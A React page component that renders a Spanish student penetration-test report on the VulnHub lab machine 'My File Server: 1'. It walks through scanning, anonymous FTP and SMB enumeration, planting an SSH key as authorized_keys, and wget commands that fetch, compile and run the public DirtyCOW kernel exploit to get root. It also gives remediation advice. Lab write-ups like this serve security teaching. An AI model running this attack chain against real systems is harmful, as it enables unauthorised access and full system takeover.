import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import ActivityFigure from "../components/activities/ActivityFigure";
import ActivitySection from "../components/activities/ActivitySection";
import ResourceLink from "../components/activities/ResourceLink";

const imageModules = import.meta.glob("../assets/activity-13/*.png", {
  eager: true,
  query: "?url",
  import: "default",
});

const image = (key) => imageModules[`../assets/activity-13/ev-${key}.png`];

const resourceBase = import.meta.env.BASE_URL + "resources/activity-13";

const pageSections = [
  { id: "resumen", label: "Executive summary" },
  { id: "alcance", label: "Alcance" },
  { id: "metodologia", label: "Metodología" },
  { id: "reconocimiento", label: "Reconocimiento" },
  { id: "enumeracion", label: "Enumeración" },
  { id: "explotacion", label: "Explotación" },
  { id: "escalada", label: "Escalada de privilegios" },
  { id: "impacto", label: "Análisis de impacto (CIA)" },
  { id: "recomendaciones", label: "Recomendaciones técnicas" },
  { id: "hallazgos", label: "Tabla de hallazgos" },
  { id: "recursos", label: "Recursos" },
];

const evidenceGroups = {
  recon: [
    ["01", "Configuración de red de Kali Linux (ip a): interfaz eth1 en 192.168.56.102/24."],
    ["02", "Hosts activos detectados por netdiscover sobre el segmento 192.168.56.0/24."],
    ["03", "nmap -p- -A: puertos FTP, SSH, HTTP y rpcbind identificados."],
    ["04", "nmap -p- -A (continuación): rpcinfo, Samba, ProFTPD, mountd y estimación de OS."],
    ["05", "nmap -p- -A (continuación): smb-security-mode con firmado de mensajes deshabilitado."],
    ["05-1", "Segundo escaneo (nmap -p- -sV) confirmando los mismos puertos y versiones."],
  ],
  ftp: [["06", "Sesión FTP anónima: directorio pub con copia completa de /var/log."]],
  web: [
    ["07", "Primer escaneo con Nikto: /readme.txt señalado como potencialmente interesante."],
    ["09", "Segundo escaneo con Nikto, confirmando el mismo hallazgo sobre /readme.txt."],
    ["10", "Acceso directo a /readme.txt desde el navegador: contraseña en texto plano."],
  ],
  smb: [["08", "smbmap -H: sesión nula con recurso smbdata en lectura/escritura abierta."]],
  exploitation: [
    ["11", "Generación de un par de llaves SSH (ssh-keygen) en Kali."],
    ["12", "Sesión FTP como smbuser: creación de .ssh y subida de authorized_keys."],
    ["13", "Acceso SSH exitoso como smbuser sin necesidad de contraseña."],
  ],
  escalation: [
    ["14", "uname -a: kernel Linux 3.10.0-229.el7, anterior al parche de DirtyCOW."],
    ["15", "Descarga del exploit DirtyCOW y servidor HTTP temporal en Kali."],
    ["16", "Compilación del exploit con gcc (advertencia de lseek sin impacto funcional)."],
    ["17", "Ejecución de ./dirtycow: sobrescritura de /usr/bin/passwd y shell como root."],
    ["18", "Lectura de /root/proof.txt, confirmando el compromiso total del sistema."],
  ],
};

function EvidenceGrid({ items, start }) {
  return (
    <div className="grid gap-x-6 md:grid-cols-2">
      {items.map(([key, caption], index) => (
        <ActivityFigure
          key={key}
          src={image(key)}
          alt={caption}
          number={String(start + index).padStart(2, "0")}
          caption={caption}
          className="max-w-none"
        />
      ))}
    </div>
  );
}

function CodeBlock({ children }) {
  return (
    <pre className="my-6 overflow-x-auto border border-border bg-foreground p-5 font-mono text-sm leading-7 text-background">
      <code>{children}</code>
    </pre>
  );
}

const findings = [
  {
    id: "H-01",
    vuln: "Acceso FTP anónimo con escritura y exposición de /var/log",
    severity: "Alta",
    evidence: "Fig. 07",
    impact:
      "Lectura de archivos de auditoría (secure, messages, cron, wtmp, btmp) por cualquier usuario no autenticado.",
    recommendation:
      "Deshabilitar el inicio de sesión anónimo en vsftpd y revisar los permisos de los directorios compartidos.",
  },
  {
    id: "H-02",
    vuln: "Contraseña en texto plano expuesta en /readme.txt",
    severity: "Alta",
    evidence: "Figs. 08, 10, 11",
    impact: "Obtención directa de una credencial válida del sistema sin necesidad de explotación.",
    recommendation: "Eliminar el archivo del servidor web y evitar almacenar o transmitir contraseñas sin cifrar.",
  },
  {
    id: "H-03",
    vuln: "Sesión nula de SMB permite enumerar usuarios y recursos",
    severity: "Media",
    evidence: "Fig. 09",
    impact:
      "Revelación del nombre de usuario smbuser y de los recursos compartidos disponibles, sin autenticación previa.",
    recommendation: "Deshabilitar las sesiones nulas en la configuración de Samba (restrict anonymous).",
  },
  {
    id: "H-04",
    vuln: "Recurso compartido smbdata con lectura y escritura sin autenticación",
    severity: "Alta",
    evidence: "Fig. 09",
    impact: "Cualquier usuario de la red interna puede leer, modificar o eliminar el contenido del recurso.",
    recommendation: "Restringir los permisos del recurso y exigir autenticación válida para accederlo.",
  },
  {
    id: "H-05",
    vuln: "Firmado de mensajes SMB (message signing) deshabilitado",
    severity: "Media",
    evidence: "Fig. 05",
    impact: "Mayor exposición a ataques de tipo SMB relay.",
    recommendation: "Habilitar el firmado de mensajes de forma obligatoria en la configuración de Samba.",
  },
  {
    id: "H-06",
    vuln: "Kernel de Linux desactualizado, vulnerable a DirtyCOW (CVE-2016-5195)",
    severity: "Crítica",
    evidence: "Figs. 15, 18, 19",
    impact: "Escalada de privilegios de usuario estándar a root, con control total del sistema.",
    recommendation: "Actualizar el kernel a una versión parchada o migrar a un sistema operativo con soporte activo.",
  },
  {
    id: "H-07",
    vuln: "Método HTTP TRACE habilitado en Apache",
    severity: "Baja",
    evidence: "Fig. 08",
    impact: "Posible explotación mediante ataques de Cross-Site Tracing (XST).",
    recommendation: "Deshabilitar el método TRACE en la configuración del servidor Apache.",
  },
  {
    id: "H-08",
    vuln: "Encabezados de seguridad HTTP faltantes (CSP, HSTS, X-Content-Type-Options)",
    severity: "Baja",
    evidence: "Fig. 08",
    impact: "Mayor superficie de ataque frente a técnicas del lado del cliente como XSS o MIME sniffing.",
    recommendation: "Configurar los encabezados de seguridad recomendados en Apache.",
  },
];

function SeverityBadge({ level }) {
  const isHigh = level === "Crítica" || level === "Alta";
  return (
    <span
      className={[
        "font-mono text-[0.68rem] tracking-wider uppercase",
        isHigh ? "font-semibold text-accent" : "text-muted",
      ].join(" ")}
    >
      {level}
    </span>
  );
}

function Activity13() {
  const [activeSection, setActiveSection] = useState(pageSections[0].id);

  useEffect(() => {
    const sectionElements = pageSections
      .map((section) => document.getElementById(section.id))
      .filter(Boolean);

    const observer = new IntersectionObserver(
      (entries) => {
        const visibleEntry = entries
          .filter((entry) => entry.isIntersecting)
          .sort(
            (first, second) =>
              second.intersectionRatio - first.intersectionRatio,
          )[0];

        if (visibleEntry) setActiveSection(visibleEntry.target.id);
      },
      {
        rootMargin: "-24% 0px -62% 0px",
        threshold: [0, 0.25, 0.5, 0.75],
      },
    );

    sectionElements.forEach((section) => observer.observe(section));
    return () => observer.disconnect();
  }, []);

  return (
    <article>
      <header className="border-b border-border">
        <div className="mx-auto max-w-7xl px-5 pt-8 pb-14 sm:px-8 md:pt-10 md:pb-20">
          <Link
            to="/activities"
            className="inline-flex min-h-11 items-center text-sm font-semibold text-muted transition-colors hover:text-accent"
          >
            Volver a actividades
          </Link>

          <div className="mt-6 grid gap-12 lg:grid-cols-12 lg:items-end">
            <div className="lg:col-span-8">
              <p className="font-mono text-xs tracking-[0.18em] text-accent uppercase">
                Parcial II / Actividad 13
              </p>
              <h1 className="mt-6 max-w-5xl text-[clamp(2.75rem,6vw,5.25rem)] leading-[0.94] font-semibold tracking-[-0.055em]">
                Red team report:{" "}
                <span className="font-serif font-normal italic text-accent">
                  My File Server 1
                </span>
              </h1>
              <p className="mt-8 max-w-3xl text-[clamp(1.1rem,2vw,1.35rem)] leading-8 text-muted">
                Informe de pruebas de penetración de caja negra sobre un
                servidor de archivos corporativo simulado, desde el
                reconocimiento hasta la obtención de acceso root.
              </p>
            </div>

            <dl className="grid grid-cols-2 gap-x-6 gap-y-5 border-t border-border pt-6 font-mono text-xs lg:col-span-4 lg:border-t-0 lg:border-l lg:pt-0 lg:pl-10">
              <div>
                <dt className="tracking-wider text-muted uppercase">Estado</dt>
                <dd className="mt-1 text-accent">Completo</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">Riesgo</dt>
                <dd className="mt-1 text-accent">Crítico</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Atacante
                </dt>
                <dd className="mt-1">Kali Linux</dd>
              </div>
              <div>
                <dt className="tracking-wider text-muted uppercase">
                  Objetivo
                </dt>
                <dd className="mt-1">My File Server: 1</dd>
              </div>
            </dl>
          </div>

          <div className="mt-10 flex flex-wrap gap-3">
            <a
              href={resourceBase + "/184346_act13.pdf"}
              download="184346_act13.pdf"
              className="inline-flex min-h-11 items-center justify-center bg-accent px-5 py-3 text-sm font-semibold text-background transition-colors hover:bg-accent-hover"
            >
              Descargar informe
            </a>
            {/* <Link
              to="/activities/activity-13#hallazgos"
              className="inline-flex min-h-11 items-center justify-center border border-border px-5 py-3 text-sm font-semibold transition-colors hover:border-accent hover:bg-surface"
            >
              Ver hallazgos
            </Link> */}
            <a
              href={resourceBase + "/184346_pptx13.pdf"}
              download="184346_pptx13.pdf"
              className="inline-flex min-h-11 items-center justify-center bg-accent px-5 py-3 text-sm font-semibold text-background transition-colors hover:bg-accent-hover"
            >
              Descargar presentación
            </a>
          </div>
        </div>
      </header>

      <div className="mx-auto grid max-w-7xl gap-14 px-5 py-16 sm:px-8 md:py-24 lg:grid-cols-12 lg:gap-16">
        <aside className="lg:col-span-3">
          <div className="border-t border-border pt-5 lg:sticky lg:top-36">
            <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
              En este informe
            </p>
            <nav aria-label="Contenido de la Actividad 13" className="mt-4">
              <ol className="space-y-1">
                {pageSections.map((section, index) => (
                  <li key={section.id}>
                    <Link
                      to={`/activities/activity-13#${section.id}`}
                      aria-current={
                        activeSection === section.id ? "location" : undefined
                      }
                      className={[
                        "grid min-h-10 grid-cols-[2rem_1fr] items-center border-l pl-3 text-sm transition-[color,border-color,transform] duration-200",
                        activeSection === section.id
                          ? "translate-x-1 border-accent text-accent"
                          : "border-transparent text-muted hover:text-accent",
                      ].join(" ")}
                    >
                      <span className="font-mono text-[0.65rem]">
                        {String(index + 1).padStart(2, "0")}
                      </span>
                      <span>{section.label}</span>
                    </Link>
                  </li>
                ))}
              </ol>
            </nav>

            <div className="mt-8 border-t border-border pt-5">
              <p className="font-mono text-[0.68rem] tracking-wider text-muted uppercase">
                Herramientas
              </p>
              <p className="mt-3 text-sm leading-6 text-muted">
                netdiscover · Nmap · cliente FTP · Nikto · smbmap · ssh-keygen
                · OpenSSH · DirtyCOW (CVE-2016-5195)
              </p>
            </div>
          </div>
        </aside>

        <div className="space-y-24 lg:col-span-9">
          <ActivitySection id="resumen" number="01" title="Executive summary">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Este informe documenta las pruebas de penetración realizadas
                sobre la máquina virtual <strong>My File Server: 1</strong>, un
                entorno vulnerable publicado en VulnHub que simula un servidor
                de archivos corporativo. El objetivo fue identificar las
                vulnerabilidades presentes en el sistema, explotarlas de forma
                controlada y evaluar el nivel de exposición real que
                representarían en un entorno de producción.
              </p>
              <p>
                La evaluación se realizó en un laboratorio aislado, con la
                máquina víctima y el equipo atacante Kali Linux conectados
                únicamente mediante una red interna tipo host-only, sin acceso
                a redes externas.
              </p>
              <p>
                Durante el reconocimiento se identificaron múltiples servicios
                con configuraciones débiles: acceso FTP anónimo con permisos
                de escritura, un archivo de texto accesible desde el servidor
                web con una contraseña sin cifrar, y una sesión SMB nula que
                permitió enumerar usuarios del sistema sin autenticación. Con
                esta información fue posible iniciar sesión como el usuario{" "}
                <code>smbuser</code> mediante SSH, y posteriormente escalar
                privilegios hasta obtener acceso total como root explotando{" "}
                <strong>DirtyCOW (CVE-2016-5195)</strong>, presente porque el
                sistema corre un kernel de Linux de 2015 que nunca fue
                actualizado.
              </p>
              <p>
                El nivel de riesgo general de la máquina se considera{" "}
                <strong>crítico</strong>. La combinación de credenciales
                expuestas, servicios mal configurados y un kernel
                desactualizado permite a cualquier atacante con acceso a la
                red interna comprometer el sistema por completo en menos de
                una hora, sin necesidad de herramientas sofisticadas ni
                conocimientos avanzados.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection id="alcance" number="02" title="Alcance">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El alcance de esta evaluación se limitó exclusivamente a la
                máquina virtual My File Server: 1, identificada en la red de
                pruebas con la dirección <code>192.168.56.104</code>. El
                equipo atacante fue una máquina Kali Linux con dirección{" "}
                <code>192.168.56.102</code>, conectada a la víctima mediante
                una red host-only aislada de VirtualBox, sin salida a redes
                externas.
              </p>
              <p>
                Las pruebas se realizaron bajo un enfoque de{" "}
                <strong>caja negra</strong>: no se tuvo acceso previo a
                credenciales, documentación interna ni código fuente del
                sistema. Toda la información utilizada durante el ataque se
                obtuvo mediante reconocimiento activo contra los servicios
                expuestos por la propia máquina.
              </p>
              <p>
                No se evaluaron otros hosts de la red y las pruebas se
                restringieron a técnicas no destructivas, evitando en todo
                momento dejar el sistema en un estado inoperable.
              </p>
            </div>
          </ActivitySection>

          <ActivitySection
            id="metodologia"
            number="03"
            title="Metodología aplicada"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La evaluación siguió una metodología estructurada en cuatro
                fases, basada en los lineamientos generales de{" "}
                <strong>PTES</strong> (Penetration Testing Execution
                Standard): reconocimiento, enumeración, explotación y
                post-explotación (escalada de privilegios).
              </p>
              <p>
                En la fase de reconocimiento se identificó la máquina objetivo
                dentro de la red y se mapearon los servicios y puertos
                abiertos. En la enumeración se profundizó en cada servicio
                detectado para extraer información que pudiera facilitar el
                acceso inicial. La fase de explotación consistió en
                aprovechar las debilidades encontradas para obtener una
                sesión con privilegios de usuario estándar, y finalmente en
                la escalada de privilegios se buscó y explotó una
                vulnerabilidad del kernel para obtener acceso root.
              </p>
              <p>
                Las herramientas utilizadas fueron <code>netdiscover</code>,{" "}
                <code>nmap</code>, el cliente FTP estándar de Linux,{" "}
                <code>smbmap</code>, <code>Nikto</code>, <code>ssh-keygen</code>
                , <code>OpenSSH</code> y un exploit público de DirtyCOW
                (CVE-2016-5195).
              </p>
            </div>
          </ActivitySection>

          <ActivitySection
            id="reconocimiento"
            number="04"
            title="Fases de reconocimiento"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Antes de iniciar el reconocimiento se verificó la
                configuración de red del equipo atacante con <code>ip a</code>
                , confirmando que la interfaz host-only (eth1) tenía asignada
                la dirección <code>192.168.56.102/24</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(0, 1)} start={1} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Con el rango de red confirmado, se ejecutó netdiscover para
                localizar hosts activos:
              </p>
            </div>
            <CodeBlock>sudo netdiscover -i eth1 -r 192.168.56.0/24</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El escaneo detectó dos hosts además de la propia máquina de
                Kali: <code>192.168.56.100</code>, que corresponde al gateway
                de VirtualBox, y <code>192.168.56.104</code>, la máquina
                víctima de My File Server.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(1, 2)} start={2} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Para identificar los servicios expuestos se realizó un
                escaneo completo de puertos con detección de versión y
                scripts de reconocimiento:
              </p>
            </div>
            <CodeBlock>nmap -p- -A 192.168.56.104</CodeBlock>
            <div className="overflow-x-auto border-y border-border">
              <table className="w-full min-w-[38rem] text-left">
                <thead className="font-mono text-xs tracking-wider text-muted uppercase">
                  <tr>
                    <th className="px-4 py-4 font-normal">Puerto</th>
                    <th className="px-4 py-4 font-normal">Servicio</th>
                    <th className="px-4 py-4 font-normal">Versión</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  <tr>
                    <td className="px-4 py-4">21/tcp</td>
                    <td className="px-4 py-4">FTP</td>
                    <td className="px-4 py-4">vsftpd 3.0.2, acceso anónimo habilitado</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">22/tcp</td>
                    <td className="px-4 py-4">SSH</td>
                    <td className="px-4 py-4">OpenSSH 7.4</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">80/tcp</td>
                    <td className="px-4 py-4">HTTP</td>
                    <td className="px-4 py-4">Apache httpd 2.4.6 (CentOS) — "My File Server"</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">111/tcp</td>
                    <td className="px-4 py-4">rpcbind</td>
                    <td className="px-4 py-4">asociado a servicios NFS</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">445/tcp</td>
                    <td className="px-4 py-4">SMB</td>
                    <td className="px-4 py-4">Samba smbd 4.9.1</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">2049/tcp</td>
                    <td className="px-4 py-4">nfs_acl</td>
                    <td className="px-4 py-4">—</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">2121/tcp</td>
                    <td className="px-4 py-4">FTP</td>
                    <td className="px-4 py-4">ProFTPD 1.3.5 (puerto no estándar)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-4">20048/tcp</td>
                    <td className="px-4 py-4">mountd</td>
                    <td className="px-4 py-4">asociado a NFS</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <EvidenceGrid items={evidenceGroups.recon.slice(2, 5)} start={3} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Un segundo escaneo, más simple, confirmó los mismos puertos y
                versiones de servicio detectados:
              </p>
            </div>
            <CodeBlock>nmap -p- 192.168.56.104 -sV</CodeBlock>
            <EvidenceGrid items={evidenceGroups.recon.slice(5)} start={6} />
          </ActivitySection>

          <ActivitySection id="enumeracion" number="05" title="Enumeración">
            <h3 className="text-lg font-semibold">
              FTP anónimo en el puerto 21
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El escaneo de Nmap ya había señalado que el inicio de sesión
                anónimo estaba permitido en el servicio FTP. Al conectarse
                manualmente con <code>ftp 192.168.56.104</code>, fue posible
                autenticarse con el usuario <code>anonymous</code> y sin
                contraseña. Dentro del servidor se encontró un directorio{" "}
                <code>pub</code> con permisos de escritura, y navegando dentro
                de él, la carpeta <code>log</code>, que contenía una copia
                completa del directorio <code>/var/log</code> del sistema
                operativo, incluyendo archivos como <code>secure</code>,{" "}
                <code>messages</code>, <code>cron</code>, <code>wtmp</code> y{" "}
                <code>btmp</code>. La exposición de estos archivos permite que
                cualquier usuario no autenticado pueda leer registros de
                auditoría del sistema, lo que puede filtrar información
                sensible sobre usuarios, accesos y configuración interna.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.ftp} start={7} />

            <h3 className="mt-14 text-lg font-semibold">
              Servicio web en el puerto 80
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El escaneo con <code>Nikto</code> reveló problemas de
                configuración en el servidor Apache: el método HTTP TRACE
                habilitado, encabezados de seguridad faltantes
                (Content-Security-Policy, Strict-Transport-Security,
                X-Content-Type-Options) y una versión de Apache desactualizada.
                Sin embargo, lo más relevante se encontró en el archivo{" "}
                <code>/readme.txt</code>, accesible públicamente:
              </p>
            </div>
            <CodeBlock>nikto -h 192.168.56.104</CodeBlock>
            <EvidenceGrid items={evidenceGroups.web.slice(0, 2)} start={8} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Al acceder a ese archivo directamente desde el navegador se
                encontró una contraseña sin cifrar: <code>rootroot1</code>. Sin
                embargo, el archivo no indicaba a qué usuario del sistema le
                pertenecía esa contraseña.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.web.slice(2)} start={10} />

            <h3 className="mt-14 text-lg font-semibold">
              SMB en el puerto 445
            </h3>
            <div className="mt-4 max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Para identificar al usuario al que le pertenece la contraseña
                encontrada, se enumeraron los recursos compartidos de SMB:
              </p>
            </div>
            <CodeBlock>smbmap -H 192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La herramienta permitió establecer una sesión sin
                autenticación y mostró cuatro recursos compartidos, incluyendo
                uno llamado <code>smbuser</code> con acceso denegado y otro
                llamado <code>smbdata</code> con permisos de lectura y
                escritura abiertos a cualquiera. El nombre del recurso{" "}
                <code>smbuser</code> reveló el nombre de un usuario válido del
                sistema, completando las credenciales necesarias para el
                acceso inicial: usuario <code>smbuser</code>, contraseña{" "}
                <code>rootroot1</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.smb} start={9} />
          </ActivitySection>

          <ActivitySection id="explotacion" number="06" title="Explotación">
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                En lugar de intentar un acceso SSH directo con usuario y
                contraseña, se optó por usar el permiso de escritura
                disponible por FTP para generar una llave pública SSH en el
                directorio home de <code>smbuser</code>, una técnica habitual
                cuando se cuenta con acceso de escritura sobre esa ruta.
                Primero se generó un par de llaves en Kali:
              </p>
            </div>
            <CodeBlock>ssh-keygen</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El sistema generó, por defecto, un par de llaves ED25519 sin
                passphrase.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(0, 1)} start={11} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Usando las credenciales de <code>smbuser</code>, se inició
                sesión por FTP y se creó el directorio <code>.ssh</code>{" "}
                dentro de su home, subiendo la llave pública con el nombre{" "}
                <code>authorized_keys</code>:
              </p>
            </div>
            <CodeBlock>{`ftp 192.168.56.104
> mkdir .ssh
> cd .ssh
> put /home/kali/.ssh/id_ed25519.pub authorized_keys`}</CodeBlock>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(1, 2)} start={12} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La transferencia se completó correctamente y, con la llave
                autorizada en el servidor, se estableció conexión por SSH sin
                necesidad de una contraseña:
              </p>
            </div>
            <CodeBlock>ssh smbuser@192.168.56.104</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El acceso fue exitoso, mostrando el mensaje que identifica la
                máquina (Armour Infosec / My File Server - 1) y confirmando el
                acceso como el usuario <code>smbuser</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.exploitation.slice(2)} start={13} />
          </ActivitySection>

          <ActivitySection
            id="escalada"
            number="07"
            title="Escalada de privilegios"
          >
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Una vez dentro del sistema como <code>smbuser</code>, se
                verificó la versión del kernel para identificar posibles
                vulnerabilidades de escalada de privilegios:
              </p>
            </div>
            <CodeBlock>uname -a</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                El resultado mostró un kernel Linux{" "}
                <code>3.10.0-229.el7.x86_64</code>, compilado en marzo de
                2015. Esta versión es anterior al parche de la vulnerabilidad{" "}
                <strong>DirtyCOW (CVE-2016-5195)</strong>, una condición de
                carrera en el subsistema de memoria del kernel de Linux que
                permite a un usuario sin privilegios escribir en archivos de
                solo lectura, incluyendo binarios del sistema.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(0, 1)} start={14} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se descargó un exploit público de DirtyCOW desde GitHub
                directamente en Kali, y para transferirlo a la víctima se
                levantó un servidor HTTP temporal:
              </p>
            </div>
            <CodeBlock>{`# En Kali
wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2016/CVE-2016-5195/40616.c
python3 -m http.server 8080

# Desde la víctima
wget http://192.168.56.102:8080/40616.c`}</CodeBlock>
            <EvidenceGrid items={evidenceGroups.escalation.slice(1, 2)} start={15} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Se confirmó que el sistema contaba con <code>gcc 4.8.5</code> y
                se compiló el exploit. La compilación mostró una advertencia
                sobre un argumento de la función <code>lseek</code>, que no
                afecta el funcionamiento del exploit:
              </p>
            </div>
            <CodeBlock>gcc 40616.c -o dirtycow -pthread</CodeBlock>
            <EvidenceGrid items={evidenceGroups.escalation.slice(2, 3)} start={16} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Al ejecutar el exploit, el programa sobrescribió temporalmente
                el binario <code>/usr/bin/passwd</code> para obtener una shell
                con privilegios de root:
              </p>
            </div>
            <CodeBlock>./dirtycow</CodeBlock>
            <EvidenceGrid items={evidenceGroups.escalation.slice(3, 4)} start={17} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Dentro de <code>/root</code> se encontró el archivo{" "}
                <code>proof.txt</code>, que confirmó el compromiso total del
                sistema: <em>"Best of Luck"</em> y el hash{" "}
                <code>af52e0163b03cbf7c6dd146351594a43</code>.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(4)} start={18} />
          </ActivitySection>

          <ActivitySection
            id="impacto"
            number="08"
            title="Análisis de impacto con el modelo CIA"
          >
            <div className="grid gap-px border border-border bg-border md:grid-cols-3">
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Confidencialidad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  Comprometida en varios niveles: el FTP anónimo expuso
                  archivos de auditoría, <code>readme.txt</code> expuso una
                  contraseña en texto plano, la sesión SMB nula permitió
                  enumerar usuarios, y el acceso root final habilita lectura
                  de cualquier archivo del servidor.
                </p>
              </article>
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Integridad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  Comprometida por completo en la fase final: DirtyCOW
                  modifica binarios del sistema (<code>/usr/bin/passwd</code>).
                  Con root, un atacante podría alterar cualquier archivo o
                  registro. El recurso <code>smbdata</code> en lectura/escritura
                  abierta ya representa un riesgo de integridad por sí mismo.
                </p>
              </article>
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Disponibilidad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  No se realizaron pruebas de denegación de servicio, pero el
                  acceso root obtenido sería suficiente para detener
                  servicios, eliminar archivos críticos o dejar el sistema
                  completamente inoperable.
                </p>
              </article>
            </div>
          </ActivitySection>

          <ActivitySection
            id="recomendaciones"
            number="09"
            title="Recomendaciones técnicas"
          >
            <ul className="max-w-3xl list-disc space-y-3 pl-5 text-base leading-8 text-muted sm:text-lg">
              <li>
                Deshabilitar el acceso anónimo en el servicio FTP (vsftpd) y
                revisar los permisos de los directorios compartidos.
              </li>
              <li>
                Eliminar el archivo <code>readme.txt</code> y cualquier otro
                archivo que almacene credenciales en texto plano.
              </li>
              <li>
                Configurar Samba para rechazar sesiones nulas (
                <code>restrict anonymous</code>) y habilitar el firmado de
                mensajes de forma obligatoria.
              </li>
              <li>
                Actualizar el kernel a una versión que incluya el parche de
                DirtyCOW, o migrar a un sistema operativo con soporte activo;
                CentOS 7 ya alcanzó su fin de vida.
              </li>
              <li>
                Revisar y reforzar los permisos del recurso compartido{" "}
                <code>smbdata</code>.
              </li>
              <li>
                Deshabilitar el método HTTP TRACE en Apache y agregar los
                encabezados de seguridad recomendados (CSP, HSTS,
                X-Content-Type-Options).
              </li>
            </ul>
          </ActivitySection>

          <ActivitySection
            id="hallazgos"
            number="10"
            title="Tabla de hallazgos"
          >
            <div className="overflow-x-auto border-y border-border">
              <table className="w-full min-w-[56rem] text-left">
                <thead className="font-mono text-xs tracking-wider text-muted uppercase">
                  <tr>
                    <th className="px-4 py-4 font-normal">ID</th>
                    <th className="px-4 py-4 font-normal">Vulnerabilidad</th>
                    <th className="px-4 py-4 font-normal">Severidad</th>
                    <th className="px-4 py-4 font-normal">Evidencia</th>
                    <th className="px-4 py-4 font-normal">Impacto</th>
                    <th className="px-4 py-4 font-normal">Recomendación</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  {findings.map((row) => (
                    <tr key={row.id}>
                      <td className="px-4 py-4 align-top font-mono text-xs text-accent">
                        {row.id}
                      </td>
                      <td className="px-4 py-4 align-top font-semibold">
                        {row.vuln}
                      </td>
                      <td className="px-4 py-4 align-top">
                        <SeverityBadge level={row.severity} />
                      </td>
                      <td className="px-4 py-4 align-top font-mono text-xs text-muted">
                        {row.evidence}
                      </td>
                      <td className="px-4 py-4 align-top text-muted">
                        {row.impact}
                      </td>
                      <td className="px-4 py-4 align-top text-muted">
                        {row.recommendation}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </ActivitySection>

          <ActivitySection id="recursos" number="11" title="Recursos">
            <div className="grid gap-5 sm:grid-cols-2">
              <ResourceLink
                href={resourceBase + "/184346_act13.pdf"}
                download="184346_act13.pdf"
                type="PDF"
                title="Informe completo"
                description="Red Team Report con metodología, evidencias, análisis de impacto y tabla de hallazgos."
              />
              <div
                aria-hidden="true"
                className="min-h-36 border border-dashed border-border"
              />
            </div>
          </ActivitySection>
        </div>
      </div>
    </article>
  );
}

export default Activity13;
